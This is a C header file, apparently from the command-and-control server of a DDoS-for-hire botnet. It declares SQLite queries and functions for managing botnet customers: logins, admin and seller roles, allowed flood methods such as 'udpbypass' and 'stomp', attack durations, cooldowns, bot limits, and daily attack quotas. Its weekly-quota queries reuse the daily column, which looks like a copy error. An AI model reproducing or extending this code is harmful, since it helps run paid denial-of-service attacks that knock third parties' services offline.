#pragma once

#include <sqlite3.h>

#include "client.h"

#define DEFAULT_CLIENT_FLOODS "udpbypass,udpplain,stomp,std"

static const char *sql_get_users = "SELECT * FROM botnet";

static const char *sql_get_daily_attacks = "SELECT daily_attacks_left FROM botnet WHERE username = ?";
static const char *sql_set_daily_attacks = "UPDATE botnet SET daily_attacks_left = ? WHERE username = ?";

static const char *sql_get_weekly_attacks = "SELECT daily_attacks_left FROM botnet WHERE username = ?";
static const char *sql_set_weekly_attacks = "UPDATE botnet SET daily_attacks_left = ? WHERE username = ?";

static const char *sql_get_user = "SELECT username, password FROM botnet WHERE username = ?";
static const char *sql_get_fields = "SELECT is_admin, is_seller, floods, attack_time, cooldown, max_bots FROM botnet WHERE username = ?";

extern sqlite3 *conn;

/* 
	24hour = 86400 seconds
	7w = 86400 * 7 seconds
*/

BOOL client_renew_hour(client_t *);
BOOL client_add_user_flood(client_t *);
BOOL client_mod_daily_attacks(client_t *);
BOOL client_on_cooldown(client_t *);
BOOL client_set_cooldown_timer(client_t *, uint32_t);
BOOL client_check_daily_attacks(client_t *);
BOOL client_check_login(client_t *);
BOOL client_update_fields(client_t *);
BOOL client_is_expired(client_t *);
BOOL client_delete_user(client_t *);
BOOL client_add_user(client_t *);
BOOL client_renew_user(client_t *);
void client_list_users(client_t *);

BOOL client_reset_daily_attacks(void);

BOOL sql_renew_hour(char *, int);
BOOL sql_mod_floods(char *, char *);
BOOL sql_mod_daily_attacks(char *, int);
BOOL sql_renew_user(char *, int);
BOOL sql_set_int_val(char *, char *, int);
BOOL sql_delete_user(char *);
BOOL sql_insert_user(char *, char *, char *, char *, int, int, int, int);

void sql_get_text_val(char *, char *, const char **);
int sql_get_int_val(char *, char *);

void database_open(void);
